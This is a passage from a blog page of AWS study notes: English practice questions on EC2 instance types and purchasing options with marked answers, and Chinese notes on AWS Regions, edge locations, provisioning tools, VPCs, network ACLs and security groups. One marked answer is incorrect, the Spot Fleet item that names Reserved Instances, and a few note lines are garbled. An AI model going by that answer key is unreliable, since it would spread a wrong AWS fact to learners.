<li><input disabled="" type="checkbox"> • <strong>2 or 4 years</strong></li>
<li><input disabled="" type="checkbox"> • <strong>6 months or 1 year</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Anytime between 1 and 3 years</strong></li>
</ul>
<p><strong>You would like to deploy a High-Performance Computing (HPC) application on EC2 instances. Which EC2 instance type should you choose?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
</ul>
<blockquote>
<p>Compute Optimized EC2 instances are great for compute-intensive workloads requiring high-performance processors (e.g., batch processing, media transcoding, high-performance computing, scientific modeling &amp; machine learning, and dedicated gaming servers).</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>Which EC2 Purchasing Option should you use for an application you plan to run on a server continuously for 1 year?</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
</ul>
<blockquote>
<p>Reserved Instances are good for long workloads. You can reserve EC2 instances for 1 or 3 years.</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand Instances</strong></li>
</ul>
<p><strong>You are preparing to launch an application that will be hosted on a set of EC2 instances. This application needs some software installation and some OS packages need to be updated during the first launch. What is the best way to achieve this when you launch the EC2 instances?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Connect to each EC2 instance using SSH, then install the required software and update your OS packages manually</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Write a bash script that installs the required software and updates to your OS, then contact AWS Support and provide them with the script. They will run it on your EC2 instances at launch</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Write a bash script that installs the required software and updates to your OS, then use this script in EC2 User Data when you launch your EC2 instances</strong></li>
</ul>
<p><strong>Which EC2 Instance Type should you choose for a critical application that uses an in-memory database?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>You have an e-commerce application with an OLTP database hosted on-premises. This application has popularity which results in its database has thousands of requests per second. You want to migrate the database to an EC2 instance. Which EC2 Instance Type should you choose to handle this high-frequency OLTP database?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Compute Optimized</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Storage Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Memory Optimized</strong></li>
<li><input disabled="" type="checkbox"> • <strong>General Purpose</strong></li>
</ul>
<p><strong>Security Groups can be attached to only one EC2 instance.</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>False</strong></li>
<li><input disabled="" type="checkbox"> • <strong>True</strong></li>
</ul>
<p><strong>You’re planning to migrate on-premises applications to AWS. Your company has strict compliance requirements that require your applications to run on dedicated servers. You also need to use your own server-bound software license to reduce costs. Which EC2 Purchasing Option is suitable for you?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Convertible Reserved Instances</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
</ul>
<p><strong>You would like to deploy a database technology on an EC2 instance and the vendor license bills you based on the physical cores and underlying network socket visibility. Which EC2 Purchasing Option allows you to get visibility into them?</strong></p>
<ul>
<li><input disabled="" type="checkbox"> • <strong>Spot Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand</strong></li>
<li><input checked="" disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
</ul>
<p><strong>Spot Fleet is a set of Spot Instances and optionally ……………</strong></p>
<ul>
<li><input checked="" disabled="" type="checkbox"> • <strong>Reserved Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>On-Demand Instances</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Hosts</strong></li>
<li><input disabled="" type="checkbox"> • <strong>Dedicated Instances</strong></li>
</ul>

      
    </div>
    
    <div class="article-info article-info-index">
      
      
      

      
      <div class="clearfix"></div>
    </div>
      
    
  </div>
  
</article>






  
    <article id="post-AWS34" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2024/12/21/AWS34/" class="article-date">
  	<time datetime="2024-12-21T12:32:07.074Z" itemprop="datePublished">2024-12-21</time>
</a>
    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2024/12/21/AWS34/">
        AWS infrastructure 2
        
      </a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
        <h1 id="單元-3-簡介"><a href="#單元-3-簡介" class="headerlink" title="單元 3 簡介"></a><strong>單元 3 簡介</strong></h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">高可用性概念</span><br><span class="line">└─ 提供可靠服務的能力，即使面臨突發事件或故障</span><br><span class="line"></span><br><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 資源分佈</span><br><span class="line">│    ├─ 遍布全球各地的 AWS 區域</span><br><span class="line">│    │    ├─ 提供高可用性和容錯能力</span><br><span class="line">│    │    └─ 客戶可以在不同區域使用 AWS 服務</span><br><span class="line">│    └─ 每個區域有多個可用區域</span><br><span class="line">│         └─ 提供在單一區域中提高可用性和容錯能力的選項</span><br><span class="line">└─ 用咖啡店比喻</span><br><span class="line"><span class="code">     ├─ 分店分佈</span></span><br><span class="line"><span class="code">     │    ├─ 在不同地點開設的咖啡店</span></span><br><span class="line"><span class="code">     │    └─ 客戶可前往其他分店繼續享用服務</span></span><br><span class="line"><span class="code">     └─ 遇到突發事件</span></span><br><span class="line"><span class="code">          ├─ 如遊行、水災或停電</span></span><br><span class="line"><span class="code">          └─ 客戶仍能在其他分店繼續享用服務</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="AWS-全球基礎設施"><a href="#AWS-全球基礎設施" class="headerlink" title="AWS 全球基礎設施"></a><strong>AWS 全球基礎設施</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">基本業務需求</span><br><span class="line">└─ 應用程式執行、內容存儲、資料分析等需求</span><br><span class="line"></span><br><span class="line">資料中心的挑戰</span><br><span class="line">└─ 天災或故障導致與資料中心失去連線</span><br><span class="line"><span class="code">    └─ 自經營資料中心至資料備份等解決方式，但存在成本與風險</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 區域建立</span><br><span class="line">│   ├─ 全球各地 AWS 區域</span><br><span class="line">│   │   └─ 包含多個可用區域</span><br><span class="line">│   │       └─ 擁有完整運算、儲存和服務設施</span><br><span class="line">│   └─ 區域間連線</span><br><span class="line">│        └─ 透過高速光纖網路連線</span><br><span class="line">│             └─ 提供全球營運支援</span><br><span class="line">└─ 區域資料主權</span><br><span class="line"><span class="code">     ├─ 資料受當地法律和國家法令約束</span></span><br><span class="line"><span class="code">     └─ 資料不會跨區域轉移</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">選取區域</span><br><span class="line">├─ 符合資料管控和法規要求</span><br><span class="line">│    └─ 根據公司及位置需求，在特定區域執行資料，如倫敦地區</span><br><span class="line">├─ 接近您的客戶,考慮與客戶群距離</span><br><span class="line">│    └─ 選取靠近客戶地區，加速內容傳遞，如維吉尼亞北部地區和新加坡</span><br><span class="line">├─ 區域內的可用服務,功能可用性</span><br><span class="line">│    └─ 考慮區域內提供的服務和功能，如Amazon Braket 在特定區域的可用性</span><br><span class="line">└─ 定價</span><br><span class="line"><span class="code">     └─ 考慮區域的價格成本，如聖保羅地區相比奧勒岡州的成本增加50%</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="節點"><a href="#節點" class="headerlink" title="節點"></a><strong>節點</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 全球基礎設施好處</span><br><span class="line">├─ 能提供更好的客戶服務</span><br><span class="line">├─ 可在全球各地建立衛星分店來服務客戶</span><br><span class="line">├─ 可在當地放置資料複本或快取，提高存取效率</span><br><span class="line">│   └─ 使用 CDN 概念，如 AWS CloudFront</span><br><span class="line">└─ 提供 AWS Outposts 解決方案，可在自己的大樓內使用 AWS 服務</span><br><span class="line"></span><br><span class="line">CDN Amazon CloudFront</span><br><span class="line">├─ 用於提供全球客戶資料、影片、應用程式和 API 的服務</span><br><span class="line">├─ 具有低延遲和高傳輸速度特性</span><br><span class="line">└─ 使用節點技術，在全球協助加速與使用者的通訊</span><br><span class="line"></span><br><span class="line">AWS 節點功能</span><br><span class="line">├─ 執行 CloudFront</span><br><span class="line">├─ 執行 DNS，如 Amazon Route 53</span><br><span class="line">└─ 可在全球範圍內加快通訊和內容交付</span><br><span class="line"></span><br><span class="line">AWS Outposts</span><br><span class="line">└─ 安裝一個完整運作的迷你區域在您的資料中心內，由 AWS 操作</span><br><span class="line"><span class="code">    └─ 提供 AWS 全功能，但設備獨立在您的大樓內</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34.png" alt="Untitled"></p>
<ol>
<li>來源: 假設公司的資料存放在巴西，而您有住在中國的客戶。若要提供內容給這些客戶，您並不需要將所有內容都移至某個中國區域。</li>
<li>節點: 您可以在靠近中國客戶的節點對本機的副本進行快取，不需要讓客戶從巴西取得資料。 </li>
<li>客戶: 如果中國的客戶請求您的某個檔案，Amazon CloudFront 會從節點的快取中擷取檔案，然後將檔案傳送給客戶。由於檔案來自中國附近的節點，而非巴西的原始來源，因此檔案交付給客戶的速度更快。</li>
</ol>
<h2 id="如何佈建-AWS-資源"><a href="#如何佈建-AWS-資源" class="headerlink" title="如何佈建 AWS 資源"></a><strong>如何佈建 AWS 資源</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">與 AWS 服務互動的方式</span><br><span class="line">├─ 使用 API 呼叫</span><br><span class="line">│   ├─ AWS 管理主控台</span><br><span class="line">│   ├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   └─ 軟體開發套件 (SDK)</span><br><span class="line">│   </span><br><span class="line">├─ AWS 管理主控台</span><br><span class="line">│   ├─ Web 為基礎的介面</span><br><span class="line">│   ├─ 可用於存取和管理 Amazon 服務</span><br><span class="line">│   ├─ 包括精靈和自動化工作流程</span><br><span class="line">│   └─ 可透過行動應用程式執行監控資源、檢視警示和存取帳單資訊</span><br><span class="line"></span><br><span class="line">├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   ├─ 讓您從命令列控制多個 AWS 服務</span><br><span class="line">│   ├─ 適用於 Windows、macOS 和 Linux</span><br><span class="line">│   └─ 可用於自動化服務和應用程式動作</span><br><span class="line"></span><br><span class="line">└─ 軟體開發套件 (SDK)</span><br><span class="line"><span class="code">    ├─ 透過專為程式設計語言或平台設計的 API</span></span><br><span class="line"><span class="code">    ├─ 可讓您更輕鬆地使用 AWS 服務</span></span><br><span class="line"><span class="code">    └─ 支援的程式設計語言包括 C++、Java、.NET 等</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34_1.png" alt="Untitled"></p>
<p><img src="/img/AWS34_2.png" alt="Untitled"></p>
<p><img src="/img/AWS34_3.png" alt="Untitled"></p>
<p><img src="/img/AWS34_4.png" alt="Untitled"></p>
<p><img src="/img/AWS34_5.png" alt="Untitled"></p>
<p><img src="/img/AWS34_6.png" alt="Untitled"></p>
<p>手動操作容易可能忘記勾選選項或是遺漏設定</p>
<p>使用可讓你撰寫或程式設計的API呼叫工具 - AWS CLI</p>
<ul>
<li>撰寫指令啟動EC2 - 指令可重複輸入，減少出錯率</li>
<li>程式以排程的方式執行</li>
<li>自動化部屬應用</li>
</ul>
<p><img src="/img/AWS34_7.png" alt="Untitled"></p>
<p><img src="/img/AWS34_8.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">與 AWS 互動的方式</span><br><span class="line">├─ 使用 API 呼叫</span><br><span class="line">│   ├─ AWS 管理主控台</span><br><span class="line">│   ├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   └─ 軟體開發套件 (SDK)</span><br><span class="line">│   </span><br><span class="line">├─ AWS 管理主控台</span><br><span class="line">│   ├─ Web 為基礎的介面</span><br><span class="line">│   ├─ 可用於存取和管理 Amazon 服務</span><br><span class="line">│   ├─ 包括精靈和自動化工作流程</span><br><span class="line">│   └─ 可透過行動應用程式執行監控資源、檢視警示和存取帳單資訊</span><br><span class="line"></span><br><span class="line">├─ AWS 命令列界面 (CLI)</span><br><span class="line">│   ├─ 讓您從命令列控制多個 AWS 服務</span><br><span class="line">│   ├─ 適用於 Windows、macOS 和 Linux</span><br><span class="line">│   └─ 可用於自動化服務和應用程式動作</span><br><span class="line"></span><br><span class="line">├─ 軟體開發套件 (SDK)</span><br><span class="line">│   ├─ 透過專為程式設計語言或平台設計的 API</span><br><span class="line">│   ├─ 可讓您更輕鬆地使用 AWS 服務</span><br><span class="line">│   └─ 支援的程式設計語言包括 C++、Java、.NET 等</span><br><span class="line"></span><br><span class="line">├─ AWS Elastic Beanstalk</span><br><span class="line">│   ├─ 負責佈建環境所需的資源</span><br><span class="line">│   │   ├─ 調整容量</span><br><span class="line">│   │   ├─ 負載平衡</span><br><span class="line">│   │   ├─ 自動擴展</span><br><span class="line">│   │   └─ 應用程式運作狀態監控</span><br><span class="line"></span><br><span class="line">└─ AWS CloudFormation</span><br><span class="line"><span class="code">    ├─ Infrastructure as Code 工具</span></span><br><span class="line"><span class="code">    ├─ 使用 JSON 或 YAML 文件定義 AWS 資源</span></span><br><span class="line"><span class="code">    ├─ 可重複部署且自動化建立基礎設施</span></span><br><span class="line"><span class="code">    └─ 在堆疊管理中提供自動復原變更的功能</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34_9.png" alt="Untitled"></p>
<p><img src="/img/AWS34_10.png" alt="Untitled"></p>
<p><img src="/img/AWS34_11.png" alt="Untitled"></p>
<p><img src="/img/AWS34_12.png" alt="Untitled"></p>
<h2 id="單元-3-總結"><a href="#單元-3-總結" class="headerlink" title="單元 3 總結"></a><strong>單元 3 總結</strong></h2><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">AWS 全球基礎設施</span><br><span class="line">├─ 可用區域形成區域，遍及全球</span><br><span class="line">│   ├─ 選擇在哪個區域和可用區域運作</span><br><span class="line">│   └─ 建議至少在兩個可用區域部署基礎設施</span><br><span class="line">│   </span><br><span class="line">├─ 自動部署多個可用區域的服務</span><br><span class="line">│   ├─ Elastic Load Balancing</span><br><span class="line">│   ├─ Amazon SQS</span><br><span class="line">│   └─ Amazon SNS</span><br><span class="line">│   </span><br><span class="line">├─ 節點部署內容以加速提供給客戶的速度</span><br><span class="line">│   </span><br><span class="line">└─ AWS Outposts</span><br><span class="line"><span class="code">    └─ 邊緣裝置，讓您在自己的資料中心運作 AWS 基礎設施</span></span><br><span class="line"><span class="code"></span></span><br><span class="line">AWS 資源佈建工具</span><br><span class="line">├─ AWS Management Console</span><br><span class="line">├─ 開發套件 SDK</span><br><span class="line">├─ CLI</span><br><span class="line">├─ AWS Elastic Beanstalk</span><br><span class="line">└─ AWS CloudFormation</span><br><span class="line"><span class="code">    └─ 將基礎設施設定為程式碼</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h3 id="單元-3-測驗"><a href="#單元-3-測驗" class="headerlink" title="單元 3 測驗"></a><strong>單元 3 測驗</strong></h3><p>關於 AWS 全球基礎設施，以下哪個敘述正確？</p>
<ul>
<li><input disabled="" type="checkbox"> 區域只含單一可用區域。</li>
<li><input disabled="" type="checkbox"> 可用區域由兩個或多個區域組成。</li>
<li><input checked="" disabled="" type="checkbox"> 區域由三個或多個可用區域組成。</li>
</ul>
<blockquote>
<p>正確的回答選項是<strong>區域由三個或多個可用區域組成</strong>。</p>
<p>例如，南美洲（聖保羅）區域是 sa-east-1。它包含三個可用區域：sa-east-1<strong>a</strong>、sa-east-1<strong>b</strong> 以及 sa-east-1<strong>c</strong>。</p>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 可用區域只含單一區域。</li>
</ul>
<p>選擇區域時應考慮哪些因素？(請選取兩個。)</p>
<ul>
<li><input checked="" disabled="" type="checkbox"> 符合資料管控和法規要求</li>
<li><input checked="" disabled="" type="checkbox"> 接近您的客戶</li>
<li><input disabled="" type="checkbox"> 全天候皆可取得技術支援</li>
<li><input disabled="" type="checkbox"> 可向不同使用者指派自訂權限的功能</li>
<li><input disabled="" type="checkbox"> 存取 AWS 命令列界面 (AWS CLI)</li>
</ul>
<blockquote>
<p>另外兩個在選取區域時要考慮的因素是定價和區域中的可用服務。</p>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>您選擇的支援層級並不是由區域決定。</li>
<li>向不同使用者指派自訂權限是在所有 AWS 區域都可以使用的功能。</li>
<li>AWS 命令列界面 (AWS CLI) 適用於所有 AWS 區域。</li>
</ul>
</blockquote>
<p>以下哪個敘述與 Amazon CloudFront 最相符？</p>
<ul>
<li><input disabled="" type="checkbox"> 一種可讓您以混合雲端方法執行基礎設施的服務</li>
<li><input disabled="" type="checkbox"> 一種容器專用的無伺服器運算引擎</li>
<li><input disabled="" type="checkbox"> 一種可讓您透過佇列在軟體元件之間傳送和接收訊息的服務</li>
<li><input checked="" disabled="" type="checkbox"> 全球內容交付服務</li>
</ul>
<blockquote>
<p>正確的回答選項是<strong>全球內容交付服務</strong>。</p>
<p>Amazon CloudFront 是一種內容交付服務。這項服務使用節點網路來快取內容，並將內容交付給世界各地的客戶。內容經過快取後，會以副本形式存放在本機。這些內容可能是影片檔案、相片、網頁等。</p>
<p>其他選項皆不正確，因為：</p>
<ul>
<li>AWS Outposts 這項服務可讓您以混合雲端方法執行基礎設施。</li>
<li>AWS Fargate 是一種容器專用的無伺服器運算引擎。</li>
<li>Amazon Simple Queue Service (Amazon SQS) 這項服務可讓您透過佇列在軟體元件之間傳送、存放和接收訊息。</li>
</ul>
</blockquote>
<p>Amazon CloudFront 使用以下哪個站點來快取內容副本，藉此在任何位置都能快速交付給使用者？</p>
<ul>
<li><input disabled="" type="checkbox"> 區域</li>
<li><input disabled="" type="checkbox"> 可用區域</li>
<li><input checked="" disabled="" type="checkbox"> 節點</li>
</ul>
<blockquote>
<p>其他回答選項皆不正確，因為：</p>
<ul>
<li>區域是指一個獨立的地理位置，其中的多個位置是彼此分隔的。</li>
<li>可用區域在 AWS 全球基礎設施中是完全分隔的。</li>
<li>來源是指 CloudFront 取得檔案的伺服器。CloudFront 原始伺服器的範例包括 Amazon Simple Storage Service (Amazon S3) 儲存貯體和 Web 伺服器。</li>
</ul>
</blockquote>
<ul>
<li><input disabled="" type="checkbox"> 來源</li>
</ul>
<p>您可以使用 AWS Outposts 執行以下哪個動作？</p>
<ul>
<li><input disabled="" type="checkbox"> 透過指令碼自動化 AWS 服務和應用程式動作。</li>
<li><input disabled="" type="checkbox"> 存取精靈和自動化工作流程，以便在 AWS 服務中執行任務。</li>
<li><input disabled="" type="checkbox"> 以支援的程式設計語言開發 AWS 應用程式。</li>
<li><input checked="" disabled="" type="checkbox"> 將 AWS 基礎設施和服務延伸到不同位置，包括您的內部部署資料中心。</li>
</ul>
<blockquote>
<p>其他選項皆不正確，因為：</p>
<ul>
<li>AWS 命令列界面 (AWS CLI) 是用於透過指令碼來自動化 AWS 服務和應用程式動作。</li>
<li>AWS 管理主控台包含可用來在 AWS 服務中完成任務的精靈和工作流程。</li>
<li>軟體開發套件 (SDK) 可讓您以支援的程式設計語言開發 AWS 應用程式。</li>
</ul>
</blockquote>
<h1 id="單元-4-簡介"><a href="#單元-4-簡介" class="headerlink" title="單元 4 簡介"></a><strong>單元 4 簡介</strong></h1><figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon Virtual Private Cloud (VPC)</span><br><span class="line">├─ 允許在 AWS Cloud 中建立邏輯隔離部分</span><br><span class="line">├─ 允許在自定義的虛擬網路中啟動 AWS 資源</span><br><span class="line">│   ├─ 資源可以是向外公開的，可透過網際網路存取</span><br><span class="line">│   └─ 資源也可以是私有的，不能從網際網路存取，通常用於後端服務</span><br><span class="line">│   </span><br><span class="line">└─ 公有和私有的資源群組稱為子網路，有各自的 IP 地址範圍</span><br><span class="line"></span><br><span class="line">拿咖啡店舉例</span><br><span class="line">├─ 收銀員</span><br><span class="line">│   └─ 負責點餐，分配到公有子網路，與客人互動</span><br><span class="line">│   </span><br><span class="line">└─ 咖啡師</span><br><span class="line"><span class="code">    └─ 專心製作咖啡，分配到私有子網路，避免直接與客人互動</span></span><br><span class="line"><span class="code"></span></span><br></pre></td></tr></table></figure>

<h2 id="AWS-的連線能力"><a href="#AWS-的連線能力" class="headerlink" title="AWS 的連線能力"></a><strong>AWS 的連線能力</strong></h2><p><img src="/img/AWS34_13.png" alt="Untitled"></p>
<p><img src="/img/AWS34_14.png" alt="Untitled"></p>
<p><img src="/img/AWS34_15.png" alt="Untitled"></p>
<figure class="highlight markdown"><table><tr><td class="code"><pre><span class="line">Amazon Virtual Private Cloud (Amazon VPC)</span><br><span class="line">├─ 允許在 AWS Cloud 中建立邏輯隔離部分</span><br><span class="line">├─ 在這個分隔區段中，您可以在自己定義的虛擬網路中啟動資源</span><br><span class="line">│   ├─ 資源可以是向外公開的，可透過網際網路存取</span><br><span class="line">│   └─ 資源也可以是私有的，不能從網際網路存取，通常用於後端服務</span><br><span class="line">│   </span><br><span class="line">└─ 子網路是 VPC 的一個區段，當中可包含 Amazon EC2 執行個體等資源</span><br><span class="line"></span><br><span class="line">網際網路閘道</span><br><span class="line">└─ 網際網路閘道是 VPC 和網際網路之間的連結</span><br><span class="line">   ├─ 類似於咖啡店的前門，允許公有流量存取 VPC</span><br><span class="line">   └─ 沒有網際網路閘道，任何人都無法存取 VPC 內的資源</span><br><span class="line"></span><br><span class="line">虛擬私有閘道</span><br><span class="line">└─ 虛擬私有閘道是允許受保護的網際網路流量進入 VPC 的元件</span><br><span class="line">   ├─ 類似於在道路上有保全保護，只允許特定的人通行</span><br><span class="line">   ├─ 在 VPC 和內部企業網路之間建立 VPN 連線</span><br><span class="line">   └─ 允許存取 VPC 中的私有資源</span><br><span class="line"></span><br><span class="line">AWS Direct Connect</span><br><span class="line">├─ 建立專用私有連線，連接資料中心和 VPC</span><br><span class="line">├─ 提供專用的私有連線，不受其他用戶影響</span><br><span class="line">└─ 如同在公寓大樓中有專用走廊通往咖啡店，只有住戶能使用的專屬通道</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><img src="/img/AWS34_16.png" alt="連接至包含三個 EC2 執行個體之 VPC 的網際網路閘道圖示。一個箭頭透過網際網路將用戶端連線至閘道，表示用戶端的請求已取得對 VPC 的存取權。"></p>
<p>連接至包含三個 EC2 執行個體之 VPC 的網際網路閘道圖示。一個箭頭透過網際網路將用戶端連線至閘道，表示用戶端的請求已取得對 VPC 的存取權。</p>
<p><img src="/img/AWS34_17.png" alt="虛擬私有閘道可讓您在 VPC 和私人網路 (例如內部部署資料中心或企業內部網路) 之間建立虛擬私人網路 (VPN) 連線。流量必須來自核准的網路，虛擬私有閘道才會允許流量進入 VPC。"></p>
<p>虛擬私有閘道可讓您在 VPC 和私人網路 (例如內部部署資料中心或企業內部網路) 之間建立虛擬私人網路 (VPN) 連線。流量必須來自核准的網路，虛擬私有閘道才會允許流量進入 VPC。</p>
<p><img src="/img/AWS34_18.png" alt="Untitled"></p>
<p>企業資料中心會將網路流量路由至 AWS Direct Connect 位置。然後，該流量會透過虛擬私有閘道路由至 VPC。企業資料中心與 VPC 之間的所有網路流量都會透過此專用私有連線流量流程。</p>
<h2 id="子網路和網路存取權限控制清單-ACL"><a href="#子網路和網路存取權限控制清單-ACL" class="headerlink" title="子網路和網路存取權限控制清單 (ACL)"></a><strong>子網路和網路存取權限控制清單 (ACL)</strong></h2><ul>
<li>VPC 網路強化<ul>
<li>安全性工具和技術<ul>
<li>網路層面安全<ul>
<li>子網路<ul>
<li>公有子網路<ul>
<li>可存取網際網路閘道</li>
</ul>
</li>
<li>私有子網路<ul>
<li>無法存取網際網路閘道</li>
</ul>
</li>
<li>控制流量權限<ul>
<li>網路 ACL (無狀態)<ul>
<li>海關審查人員的比喻</li>
<li>檢查封包進出子網路<ul>
<li>核准名單檢查<ul>
<li>流量可進出 VPC</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>安全群組 (具狀態)<ul>
<li>每個 EC2 執行個體自動加入</li>
<li>預設拒絕所有流量</li>
<li>可修改以允許特定類型的流量</li>
<li>檢查封包進出 EC2 執行個體<ul>
<li>核准名單檢查<ul>
<li>封包通過時不需再次檢查</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>封包的流動過程<ul>
<li>封包從源執行個體至目標執行個體<ul>
<li>安全群組檢查<ul>
<li>允許所有傳出流量</li>
</ul>
</li>
<li>網路 ACL 檢查<ul>
<li>核准名單檢查<ul>
<li>封包通過</li>
</ul>
</li>
</ul>
</li>
<li>安全群組再次檢查</li>
</ul>
</li>
<li>封包回傳流程<ul>
<li>安全群組允許傳回流量<ul>
<li>允許所有傳回流量</li>
</ul>
</li>
<li>網路 ACL 檢查<ul>
<li>核准名單檢查<ul>
<li>封包通過</li>
</ul>
</li>
</ul>
</li>
<li>安全群組再次檢查</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>整體效果<ul>
<li>深度安全性<ul>
<li>結合網路 ACL 和安全群組</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<p>比喻:</p>
<p><img src="/img/AWS34_19.png" alt="Untitled"></p>
<p><img src="/img/AWS34_20.png" alt="Untitled"></p>
<ul>
<li><p>咖啡店範例</p>
<ul>
<li>流程描述<ul>
<li>客人向收銀員點餐<ul>
<li>收銀員接收訂單並處理</li>
</ul>
</li>
<li>收銀員將訂單交給咖啡師<ul>
<li>咖啡師製作咖啡</li>
</ul>
</li>
<li>客人順序點餐，排隊人龍順暢移動</li>
<li>客人試圖跳過收銀員直接向咖啡師點餐<ul>
<li>中斷動線流動，導致受限制</li>
</ul>
</li>
</ul>
</li>
<li>解決方法<ul>
<li>咖啡店老闆將收銀員和咖啡師配置在不同的工作站<ul>
<li>區分櫃檯區域，保持流動順暢</li>
</ul>
</li>
<li>收銀員的工作站<ul>
<li>專為接待客人而設計</li>
</ul>
</li>
<li>咖啡師的工作站<ul>
<li>不對外開放，僅處理訂單</li>
</ul>
</li>
</ul>
</li>
<li>示意圖<ul>
<li>一名收銀員，一名咖啡師，三名排隊的客戶<ul>
<li>第一位客戶向收銀員點餐，收銀員接收訂單並轉交給咖啡師</li>
<li>最後一名客戶試圖直接向咖啡師點餐，但無法這樣做</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>子網路</p>
<p>  <img src="/img/AWS34_21.png" alt="Untitled"></p>
<ul>
<li>定義<ul>
<li>VPC 的區段，用於將資源分組，可以設為公有或私有</li>
</ul>
</li>
<li>公有子網路<ul>
<li>包含需要開放存取的資源，如線上商店的網站</li>
<li><strong>支援客戶使用的網站</strong></li>
</ul>
</li>
<li>私有子網路<ul>
<li>包含只能透過私有網路存取的資源，如含有客戶個人資訊的資料庫</li>
<li><strong>分隔含有客戶個人資訊的資料庫</strong></li>
</ul>
</li>
<li>子網路通訊<ul>
<li>可以彼此通訊，如公有子網路的 EC2 執行個體與私有子網路中的資料庫</li>
</ul>
</li>
</ul>
</li>
<li><p>網路流量</p>
<ul>
<li>封包<ul>
<li>以封包形式傳送的請求資料</li>
</ul>
</li>
<li>流量進出 VPC<ul>
<li>透過網際網路閘道進入 VPC</li>
<li>在進出子網路之前檢查權限</li>
</ul>
</li>
</ul>
</li>
<li><p>網路 ACL</p>
<p>  <img src="/img/AWS34_22.png" alt="Untitled"></p>
<ul>
<li><p>定義</p>
<ul>
<li>控制子網路層級的傳入和傳出流量的虛擬防火牆</li>
</ul>
</li>
<li><p>功能</p>
<ul>
<li><p>無狀態封包篩選</p>
<ul>
<li>忽略所有規則，檢查往來跨越子網路邊界的封包</li>
</ul>
<p>  <img src="/img/AWS34_23.png" alt="Untitled"></p>
</li>
</ul>
</li>
<li><p>設定</p>
<ul>
<li>預設網路 ACL<ul>
<li>允許所有傳入和傳出流量，可自行修改</li>
</ul>
</li>
<li>自訂網路 ACL<ul>
<li>所有流量都被拒絕，除非新增規則允許</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><p>安全群組</p>
<p>  <img src="/img/AWS34_24.png" alt="Untitled"></p>
<ul>
<li><p>定義</p>
<ul>
<li>控制 EC2 執行個體的傳入和傳出流量的虛擬防火牆</li>
</ul>
</li>
<li><p>功能</p>
<ul>
<li><p>有狀態封包篩選</p>
<p>  <img src="/img/AWS34_25.png" alt="Untitled"></p>
<p>  封包從用戶端透過網際網路傳輸到網際網路閘道，然後進入 VPC。然後，該封包通過網路存取控制清單 (ACL)，並存取兩個 EC2 執行個體所在的公有子網路。</p>
<ul>
<li>記住先前針對傳入封包所做的決定</li>
<li>無論傳入安全群組規則為何，安全群組都會允許回應繼續執行</li>
</ul>
